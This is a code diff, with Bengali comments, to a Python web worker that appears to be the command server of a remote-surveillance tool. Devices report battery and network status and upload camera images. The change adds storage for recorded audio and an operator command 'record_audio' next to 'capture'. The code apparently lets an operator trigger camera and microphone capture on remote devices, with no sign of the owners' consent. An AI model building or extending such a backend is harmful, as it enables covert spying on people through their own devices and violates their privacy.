@@ -30,13 +30,18 @@ class Default(WorkerEntrypoint):
                 data = await request.json()
                 client_id = data.get("id", "unknown_device")
                 
-                if "camera_image" in data:
+                # ছবি বা অডিও ডেটা হ্যান্ডল করা
+                if "camera_image" in data or "audio_data" in data:
                     if client_id in clients:
-                        clients[client_id]["camera_image"] = data["camera_image"]
-                        clients[client_id]["camera_time"] = data.get("time", "")
-                        # লাইভ মোডে থাকলে কমান্ড মুছবে না, অন্যথায় মুছে যাবে
-                        if clients[client_id].get("command") != "live_video":
-                            clients[client_id]["command"] = None
+                        if "camera_image" in data:
+                            clients[client_id]["camera_image"] = data["camera_image"]
+                            clients[client_id]["camera_time"] = data.get("time", "")
+                        if "audio_data" in data:
+                            clients[client_id]["audio_data"] = data["audio_data"]
+                            clients[client_id]["audio_time"] = data.get("time", "")
+                        
+                        # কমান্ড রিসেট করা
+                        clients[client_id]["command"] = None
                 else:
                     if client_id not in clients:
                         clients[client_id] = {}
@@ -51,12 +56,6 @@ class Default(WorkerEntrypoint):
                         "battery": data.get("battery", "N/A"),
                         "charging": data.get("charging", "N/A"),
                         "network": data.get("network", "N/A"),
-                        "language": data.get("language", "N/A"),
-                        "timezone": data.get("timezone", "N/A"),
-                        "screen": data.get("screen", "N/A"),
-                        "pixelRatio": data.get("pixelRatio", "N/A"),
-                        "cores": data.get("cores", "N/A"),
-                        "memory": data.get("memory", "N/A"),
                         "lastSeen": data.get("time", "")
                     })
                 return Response(json.dumps({"status": "success"}), headers={**cors_headers, "Content-Type": "application/json"})
@@ -70,7 +69,7 @@ class Default(WorkerEntrypoint):
             try:
                 data = await request.json()
                 client_id = data.get("client_id")
-                command = data.get("command") # 'capture', 'live_video', 'stop_live'
+                command = data.get("command") # 'capture', 'record_audio'
                 if client_id in clients:
                     clients[client_id]["command"] = command
                     return Response(json.dumps({"status": "success"}), headers={**cors_headers, "Content-Type": "application/json"})
